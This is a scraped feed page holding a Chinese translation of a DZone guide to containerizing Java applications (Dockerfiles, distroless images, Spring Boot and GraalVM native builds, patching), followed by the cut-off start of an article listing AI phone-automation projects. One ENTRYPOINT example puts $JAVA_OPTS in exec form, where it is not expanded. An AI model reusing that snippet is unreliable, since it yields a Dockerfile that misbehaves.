.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><em>如何开始打包、分发并将 Java 交付至生产环境</em></p>
<p><img src="https://cf-blog.icodebuddy.com/image/89/89-0.jpg" alt="" loading="lazy"/></p>
<blockquote>
<p><strong>应用程序的容器化</strong> 提供了一种方法，可以将所有必需的应用程序资源——包括程序和配置文件、环境变量、网络设置等——组合到一个标准化、易于管理的包中。</p>
</blockquote>
<p>从单个容器镜像可以启动、运行、管理和终止多个功能相同的容器，确保从镜像创建点开始的一致性。容器可以在截然不同的操作平台上运行，从本地机器到全球可扩展的云环境，以及介于两者之间的一切。可以构建流水线，轻松地在它们之间过渡。</p>
<p>虽然应用程序容器化有许多好处，但许多都可以归结为一个词：<strong>一致性</strong>。</p>
<h2 data-id="heading-0">为何要对 JAVA 应用进行容器化？</h2>
<p>Java 早期的一个承诺是"一次编写，到处运行"，即"WORA"。尽管 Java 通过其 Java 虚拟机（JVM）实现了某种形式的目标，但在实现真正无缝的体验方面仍然存在相当多的外部障碍。</p>
<p>容器化解决了几乎所有这些外部障碍。虽然 100% 在任何追求中都可能是一个难以实现的目标，但将 Java 应用程序的可执行文件及其所有必需的依赖项和支持属性（配置等）打包的能力，使我们达到了有效的 100% 可移植性和一致性水平。</p>
<h2 data-id="heading-1">为 JAVA 应用程序创建 DOCKERFILE</h2>
<p>许多开发人员通过仔细阅读官方的 Dockerfile 参考文档来开始他们的容器化工作。为了立即获得良好效果，让我们介绍关键点，创建一些镜像，并在此基础上进行构建。</p>
<h3 data-id="heading-2">为容器化选择操作系统和 JDK 构建</h3>
<p>对此有各种不同的观点，但如果您刚开始接触容器化，从一个较小但完整的操作系统（OS）开始是一个很好的第一步。我们稍后将讨论其他选项（例如，无发行版）。</p>
<p>一般来说，您在操作系统层包含的内容越多，容器镜像就越大，安全漏洞的攻击面也就越大。可信来源也是一个关键的考虑因素。如果使用完整的操作系统构建，强烈推荐使用 eclipse-temurin（基于 Ubuntu）或 Alpine 基础层。</p>
<p>任何 OpenJDK 的构建都能运行您基于 JVM 的 Java 应用程序，而 Eclipse Temurin 是众多良好选项之一。但是，如果您希望对可能发现的任何 Java 问题获得专门的生产支持，那么选择商业支持的构建可以提供这种支持。</p>
<p><img src="https://cf-blog.icodebuddy.com/image/89/89-1.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">JAVA 应用的基本 DOCKERFILE 结构</h3>
<p>一个基本 Java 应用程序的最低可行 Dockerfile 看起来像这样：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
FROM eclipse-temurin:latest

COPY java-in-the-can-0.0.1-SNAPSHOT.jar /app.jar

EXPOSE 8080

CMD ["java", "-jar", "/app.jar"]

</code></pre>
<p>将上述文本（在 <code>COPY</code> 指令中使用您应用程序的名称）保存在一个名为 <code>Dockerfile</code> 的文件中，该文件与您的 Java 应用程序（<code>.jar</code>）文件位于同一目录。</p>
<p>在上面的 Dockerfile 中，我们提供了构建容器镜像的基本信息：</p>
<ul>
<li>
<p>构建应用程序容器镜像所基于的更高层<strong>基础镜像</strong>（<code>FROM</code>）</p>
</li>
<li>
<p>将 .jar 文件<strong>复制</strong>（<code>COPY</code>）到镜像中（在此示例中，还进行了重命名）的命令</p>
</li>
<li>
<p>为应用程序监听连接请求而需要<strong>暴露</strong>（<code>EXPOSE</code>）的任何特定端口（如有必要）</p>
</li>
<li>
<p>在容器启动时运行应用程序的<strong>命令</strong>（<code>CMD</code>）</p>
</li>
</ul>
<p>在包含您的 Dockerfile 和 .jar 文件的目录中执行以下命令：</p>
<pre><code class="hljs language-bash" lang="bash">
docker build -t &lt;app-image-name&gt; .

</code></pre>
<p>请注意，在运行镜像创建和其他容器命令之前，docker 守护进程（或 Mac/Windows 上的 Docker Desktop、Podman 等）必须正在运行。另外，不要忘记命令末尾的 <code>.</code>；它指的是可以找到 Dockerfile 的当前目录。</p>
<p>以这种方式运行生成的应用程序容器，用您上面创建的容器镜像名称替换 <code>&lt;app-image-name&gt;</code>：</p>
<pre><code class="hljs language-bash" lang="bash">
docker run -p 8080:8080 &lt;app-image-name&gt;

</code></pre>
<h3 data-id="heading-4">选择无发行版操作系统+JDK 基础镜像</h3>
<p>对于大多数用例，在大小和攻击面方面可实现的最佳优化可能由"无发行版"基础镜像提供。虽然无发行版基础镜像中确实包含一个 Linux 发行版，但它已被剥离了任何非当前目的 specifically 不需要的文件，留下一个完全精简的操作系统，对于无发行版 Java 镜像而言，还包括 JVM。以下是一个使用无发行版 Java 基础镜像的 Dockerfile 示例：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
FROM mcr.microsoft.com/openjdk/jdk:21-distroless

COPY java-in-the-can-0.0.1-SNAPSHOT.jar /app.jar

EXPOSE 8080

CMD ["-Xmx256m", "-jar", "/app.jar"]

</code></pre>
<p>请注意，这个针对 Java 优化的基础镜像预先配置了 <code>java</code> 命令的 <strong>ENTRYPOINT</strong>，因此 <strong>CMD</strong> 指令用于为 JVM 启动器进程提供命令行参数。</p>
<h3 data-id="heading-5">使用多阶段构建来减小镜像大小</h3>
<p>如果您有构建所需但最终输出不需要的文件，多阶段构建提供了减小容器镜像大小的方法。就本文参考而言，情况并非如此，因为 JVM 以及应用程序的 <code>.jar</code> 文件和依赖项已为镜像创建预先配置好了。</p>
<p>正如您可能想象的那样，在某些非常常见的情况下，这变得有利。通常，应用程序通过配置好的构建流水线部署到生产环境，这些流水线基于源仓库上的触发器来创建构件。这是多阶段构建的最佳用例之一：构建流水线创建一个带有适当工具的构建容器，使用它来创建构件（例如 <code>.jar</code> 文件、配置文件），然后将这些构件复制到一个新的容器镜像中，该镜像不包含生产环境不需要的额外工具。这一系列操作大致类似于我们之前手动完成的操作，但实现了自动化，以获得一致和最优的结果。</p>
<h3 data-id="heading-6">管理环境变量</h3>
<p>有多种方法可以向容器和应用程序提供输入值，用于启动或执行。一个应该采用的良好实践是，尽可能使用 <strong>ENV</strong>、<strong>ENTRYPOINT</strong> 或 <strong>CMD</strong> 指令在 Dockerfile 本身中指定所有可能的值。所有这些值都可以在容器初始化时根据需要覆盖。</p>
<p>请注意，覆盖现有环境变量时应谨慎，因为这可能会以意外和不良的方式改变应用程序行为。</p>
<p>使用 <code>ENV</code> 配置 Java 特定选项的示例：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
ENV JAVA_OPTS="-Xmx512m -Xms256m"

</code></pre>
<p>相同的概念也适用于应用程序特定变量：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
ENV APP_GREETING="Greetings, Friend!"

</code></pre>
<p>使用 ENTRYPOINT 配置应用程序特定值的示例：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
ENTRYPOINT ["java", "$JAVA_OPTS", "-jar", "your-app.jar"]

</code></pre>
<p>使用 CMD 的示例：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
CMD ["java", "-Xmx256m", "-jar", "/app.jar"]

</code></pre>
<p>您可能已经注意到，<strong>ENTRYPOINT</strong> 和 <strong>CMD</strong> 都可以用来执行 Java 应用程序。像所有其他技术（和非技术）选项一样，这两种指令各有优缺点。如果操作得当，两者都会使您的 Java 应用程序运行。</p>
<p>一般来说，Java 应用程序使用 <strong>CMD</strong> 指令，以便应用程序可以处理操作系统信号，用于支持的钩子机制（例如，<code>SIGTERM</code> 对应 <code>java.lang.Runtime.addShutdownHook</code>）。当然，这并非绝对必要，并且可以（也经常）使用 <strong>ENTRYPOINT</strong> 和 <strong>CMD</strong> 来促进运行时参数传递，以提供/覆盖特定行为。这两者并不互斥。</p>
<h2 data-id="heading-7">使用 SPRING BOOT 插件进行容器化</h2>
<p>如果您使用 Spring Boot 开发 Java 应用程序，容器化会简单得多。无论使用 Maven 还是 Gradle 作为项目构建工具，创建容器镜像都像执行一个预定义的目标一样简单。</p>
<ul>
<li>如果使用 <strong>Maven</strong> 作为构建工具，您可以通过调用 <code>build-image</code> 目标来创建包含应用程序的容器镜像：</li>
</ul>
<p><code>./mvnw spring-boot:build-image</code></p>
<ul>
<li>如果使用 <strong>Gradle</strong> 作为构建工具，您可以通过调用 <code>bootBuildImage</code> 目标来创建包含应用程序的容器镜像：</li>
</ul>
<p><code>./gradlew bootBuildImage</code></p>
<p>在大多数情况下，自定义镜像创建（例如，镜像层定义）既不必要也不可取，但如果需要这样做，请参阅 Spring Boot Maven 或 Gradle 插件文档中的"打包 OCI 镜像"部分。</p>
<h2 data-id="heading-8">为原生应用程序构建容器镜像</h2>
<p>开发人员可以选择使用 JVM 或作为原生的、操作系统特定的可执行文件来交付 Java 应用程序。以下部分提供了一些关于选择的考虑因素，以及如果您决定使用原生应用程序构建容器镜像，如何以最小的代价实现。</p>
<h3 data-id="heading-9">使用 GRAALVM 的 JAVA 原生可执行文件</h3>
<p>GraalVM 支持创建原生可执行文件/二进制 Java 应用程序，在构建时执行所有编译和优化，而不是利用 JVM 在运行应用程序字节码时进行一些优化。</p>
<p>与所有选择一样，需要权衡利弊。编译为字节码与原生可执行文件是秒与分钟的问题，并且 JVM 执行的运行时优化在原生可执行文件中消失了，因为代码无法在运行时动态重写（这是 JVM 启用的一个特性）。</p>
<p>原生可执行文件优于基于 JVM 的 Java 应用程序的地方在于文件大小、内存需求和启动时间。原生应用程序要小得多，需要的资源更少，不需要 JVM 存在，并且启动速度显著更快。这在许多生产环境中是非常重要的考虑因素，因为较小的应用程序（及其容器）会降低平台资源需求，并且以毫秒而不是几秒衡量的启动时间可以增加可用性、可扩展性以及系统设计和部署的选项，从而可以显著节省成本。</p>
<p>根据您的框架和工具选择，有几种构建完全可执行的、操作系统原生的 Java 应用程序的选项。然而，一旦您有了原生可执行文件/二进制应用程序，您可以创建一个类似以下的 Dockerfile 作为您的原生应用程序容器镜像的模板：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">
FROM alpine:latest

WORKDIR /app

COPY java-in-the-can /app/

EXPOSE 8080

CMD ["/app/java-in-the-can"]

</code></pre>
<p>如果您使用 Spring Boot，您可以使用 GraalVM Maven 或 Gradle 插件，通过一条命令将您的应用程序编译为操作系统原生应用程序并创建容器镜像。</p>
<p><strong>MAVEN</strong></p>
<p>首先，将此依赖项添加到您的 <code>pom.xml</code> 的 <code>&lt;build&gt;&lt;plugins&gt;</code> 部分并保存文件：</p>
<pre><code class="hljs language-xml" lang="xml">
<span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.graalvm.buildtools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>native-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>

</code></pre>
<p>要构建原生应用程序和容器镜像，从您的项目根目录运行此命令：</p>
<p><code>./mvnw -Pnative spring-boot:build-image</code></p>
<p><strong>GRADLE</strong></p>
<p>类似地，将此依赖项添加到您的 <code>build.gradle</code> 文件的 <code>plugins {}</code> 部分并保存：</p>
<p><code>id 'org.graalvm.buildtools.native'</code></p>
<p>要构建原生应用程序和容器镜像，从您的项目根目录运行此命令：</p>
<p><code>./gradlew bootBuildImage</code></p>
<h2 data-id="heading-10">关于减小镜像大小和加快启动时间的考虑因素</h2>
<p>您可能已经注意到，上述各节的顺序总体上趋向于生产更精简、启动更快的容器镜像。许多决策可能涉及组织标准或选择（例如，部署标准），这些标准或选择会使天平倾向于或反对某些选择，但一般来说，容器镜像优化的路径遵循以下顺序：</p>
<ol>
<li>
<p>选择更小的基础镜像（操作系统发行版和 JVM）</p>
</li>
<li>
<p>选择带有 JVM 的无发行版镜像</p>
</li>
<li>
<p>如果您的工具链（例如 Spring Boot）允许，利用专门构建的工具</p>
</li>
<li>
<p>利用带有原生可执行应用程序的精简发行版或无发行版镜像</p>
</li>
</ol>
<h2 data-id="heading-11">容器中 JAVA 应用程序的部署策略</h2>
<p>您的应用程序的重要考虑因素超出了将其打包成应用程序容器镜像的范围。接下来是部署和维护决策，这些决策对于您的应用程序进入并保持在生产环境至关重要。</p>
<h3 data-id="heading-12">单容器部署</h3>
<p>对于基本上是自包含的应用程序，部署到生产环境可以像单个命令一样简单，前提是部署目标已准备好接受容器化应用程序。即使在应用程序部署之前必须创建支持资源的情况下，这通常也意味着通过命令行或 Web 门户发出少量指令。当应用程序包含多个容器部署时，进程间依赖关系可能要求按特定顺序部署容器，以确保可用性或最小化波动或 chatter。为了实现这些目标，需要进行编排部署。</p>
<h3 data-id="heading-13">编排部署</h3>
<p>编排部署可能比单容器部署复杂得多，并相应地提供更多功能。由于这两个特点，与单容器部署相比，编排部署可能有更多平台层级值得考虑。这些层级范围从提供广泛灵活性并相应需要开发人员付出更高水平努力的较低层级 Kubernetes 平台，到完成大量繁重工作以安全配置和集成多个容器和/或服务的完整平台。</p>
<p>您选择的目标平台将决定您对部署工具（例如，脚本、门户、基础设施配置工具）的选择。非常笼统地说，您选择的平台目标应该是能够部署和维护您的应用程序及其相关服务的最简单的平台。其他重要的考虑因素包括应用程序所有必需容器/服务的部署目标之间的比较成本、您组织已建立的实践/流水线等。</p>
<h2 data-id="heading-14">构建支持持续打补丁的 JAVA 应用程序</h2>
<p>生产部署在应用程序上线后并未完成；开发人员必须确保应用程序保持安全、最新和可用。关键的补丁管理考虑因素包括：</p>
<ul>
<li>
<p><strong>定期补丁</strong> – 为常规补丁（例如，每月或每季度）建立一个无中断、可预测的频率，以更新库和依赖项</p>
</li>
<li>
<p><strong>紧急补丁</strong> – 提供关于何时需要紧急补丁的指导，通常是为了应对关键漏洞或紧急安全更新</p>
</li>
</ul>
<p>容器镜像中需要打补丁的组件包括：</p>
<ul>
<li>
<p>基础操作系统容器镜像</p>
</li>
<li>
<p>附加的操作系统包（如果适用）</p>
</li>
<li>
<p>应用程序运行时（例如，JVM 版本，如果未包含在基础镜像中）</p>
</li>
<li>
<p>应用程序依赖项/库</p>
</li>
<li>
<p>应用程序性能监控（APM）代理二进制文件</p>
</li>
</ul>
<p>由开发人员及其组织来决定并严格维护一个保护应用程序、系统基础设施和数据的补丁策略。请参考此指南来帮助制定您的具体策略。</p>
<h2 data-id="heading-15">结论</h2>
<p>容器化使开发人员能够将所有必需的应用程序资源和支持服务组合到一个或多个容器镜像中，并更轻松地部署、运行和管理它们。如果操作得当，容器化可以从镜像创建点开始实现安全性和一致性。容器可以在截然不同的操作平台上运行，从本地机器到全球可扩展的云环境。可以构建流水线，轻松地在它们之间过渡。因此，开发人员构建和运行支持生产工作负载的相同构件，减少了冲突并简化了调优和故障排除。</p>
<p>如果您是容器新手，请从小处着手，在本地构建以获得知识和稳定的基础，然后通过纳入更多容器最佳实践、构建流水线和合适的云平台来"扩展构建"，逐步走向强大的应用程序部署生产模型。</p>
<p><strong>其他考虑因素和资源：</strong></p>
<ul>
<li>
<p>工具 – <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.docker.com%2F" target="_blank" title="https://www.docker.com/" ref="nofollow noopener noreferrer">Docker</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpodman.io%2F" target="_blank" title="https://podman.io/" ref="nofollow noopener noreferrer">Podman</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fminikube.sigs.k8s.io%2F" target="_blank" title="https://minikube.sigs.k8s.io/" ref="nofollow noopener noreferrer">Minikube</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fskaffold.dev%2F" target="_blank" title="https://skaffold.dev/" ref="nofollow noopener noreferrer">Skaffold</a></p>
</li>
<li>
<p>基于 JVM OSS 的可观测性工具 – <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.oracle.com%2Fjavacomponents%2Fjmc-5-4%2Fjfr-runtime-guide%2F" target="_blank" title="https://docs.oracle.com/javacomponents/jmc-5-4/jfr-runtime-guide/" ref="nofollow noopener noreferrer">Java Flight Recorder</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.oracle.com%2Fen%2Fjava%2Fjava-components%2Fjdk-mission-control%2F" target="_blank" title="https://docs.oracle.com/en/java/java-components/jdk-mission-control/" ref="nofollow noopener noreferrer">Java Mission Control</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fvisualvm.github.io%2F" target="_blank" title="https://visualvm.github.io/" ref="nofollow noopener noreferrer">Visual VM</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FAdoptOpenJDK%2Fjitwatch" target="_blank" title="https://github.com/AdoptOpenJDK/jitwatch" ref="nofollow noopener noreferrer">Jitwatch</a></p>
</li>
</ul>
<blockquote>
<p><strong>作者：MARK A. HECKLER,</strong></p>
</blockquote>
<blockquote>
<p><strong>微软首席云技术推广专家（Java/JVM 语言）</strong></p>
</blockquote>
<blockquote>
<p>Mark Heckler 是一名软件开发人员，微软的 Java/JVM 语言首席云技术推广专家，会议演讲者，Java Champion 和 Kotlin 开发专家，专注于为云和边缘计算平台快速开发生产软件。Mark 是开源贡献者，也是《Spring Boot: Up and Running》的作者，可以在 X @mkheck 上找到他。</p>
</blockquote>
<hr/>
<p>【注】本文译自：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdzone.com%2Frefcardz%2Fjava-application-containerization-and-deployment" target="_blank" title="https://dzone.com/refcardz/java-application-containerization-and-deployment" ref="nofollow noopener noreferrer">Java Application Containerization and Deployment</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[5 个 AI 操纵手机的 GitHub 项目，太强了]]></title>    <link>https://juejin.cn/post/7577031454585454619</link>    <guid>https://juejin.cn/post/7577031454585454619</guid>    <pubDate>2025-11-27T06:58:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577031454585454619" data-draft-id="7576936862632509440" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="5 个 AI 操纵手机的 GitHub 项目，太强了"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-11-27T06:58:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逛逛GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            5 个 AI 操纵手机的 GitHub 项目，太强了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逛逛GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:58:32.000Z" title="Thu Nov 27 2025 06:58:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在过去，如果我们想自动化操作手机，通常需要使用 Appium 或 Airtest 这样的工具，但这要求开发者必须深入了解 APP 的底层元素 ID，比如 resource-id 或 xpath。</p>
<p>一旦 APP 更新，ID 变了，脚本就废了。</p>
<p>现在有了 AI 大模型，尤其是视觉模型，让 AI 操纵手机做成了可能。推荐几个比较热门的 AI 操纵手机的开源项目，感兴趣的收藏。</p>
<h2 data-id="heading-0">01、MobiAgent：移动智能体框架</h2>
<p>这个叫 MobiAgent 的开源项目是 IPADS 实验室专为手机交互设计的框架。能让 AI 控制手机自己干活。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79552d1aea864c44b3c4ab8ca1b77938~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=3Z6k9I1U7qgCnZo%2BZujuWtHVjuA%3D" alt="图片" loading="lazy"/></p>
<p>这个智能 Agent 系统，可以把复杂任务分解为三个专业化模块：</p>
<p>Planner 负责制定整体计划，Decider 判断每一步该点击哪里，Grounder 则精准定位屏幕上的具体操作位置。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bf0018ece224af3935f4da5dd751260~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=ySMiEp6LvVzwbeBW2LyRfC4hyTY%3D" alt="图片" loading="lazy"/></p>
<p>从原理上讲，MobiAgent 包括三个核心组件：MobiMind 模型家族、AgentRR 加速框架和 MobiFlow 基准测试平台。</p>
<p>MobiMind 是智能核心，包含多个不同参数规模的模型。AgentRR 加速框架则对重复任务进行优化，大幅降低二次执行的耗时。</p>
<p>而 MobiFlow 基准测试平台，覆盖小红书、高德地图、饿了么、淘宝等 10 + 主流 App，包含简单和困难两个难度等级，为移动智能代理的性能评估提供了标准化场景。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/IPADS-SAI/MobiAgent</span>
</code></pre>
<h2 data-id="heading-1">02、Mobile-Agent：阿里开源</h2>
<p>这个叫 <strong>Mobile-Agent 的</strong>开源项目是阿里开源的。<strong>Mobile-Agent</strong> 能看见屏幕、能点击按钮、能像人一样跨 APP 操作，而且不依赖原本复杂的系统后台接口，而是像人类一样，通过看屏幕来操作手机。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d186c804a9354ba5bdfb8f2dff116678~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=eroY6p2XV8m0lutGGNQbu1LvGcQ%3D" alt="图片" loading="lazy"/></p>
<p>原理都差不多， AI 识别屏幕上的所有图标、文字和按钮。即使按钮没有文字说明，只有一个图标，它也能通过视觉理解其含义。</p>
<p>根据你的指令生成一步步的计划。然后 AI 结合当前屏幕状态，决定下一步具体点哪里，还是滑动，或者是输入文字。</p>
<p>通过 ADB（Android Debug Bridge）向手机发送点击或滑动指令。而且每执行一步，它会再次截图确认，如果发现不对，它会自我修正。</p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/X-PLUG/MobileAgent</span>
</code></pre>
<h2 data-id="heading-2">03、Droidrun机自动化 Agent 框架</h2>
<p>Droidrun 是一个基于 AI 大模型的 Android/iOS 自动化 Agent 框架。</p>
<p>目前在 GitHub 上有 6.2K 的 Star。</p>
<p>它的核心理念是将思考交给 AI，将执行交给框架，从而打破了传统自动化脚本对特定 UI 控件的强依赖。</p>
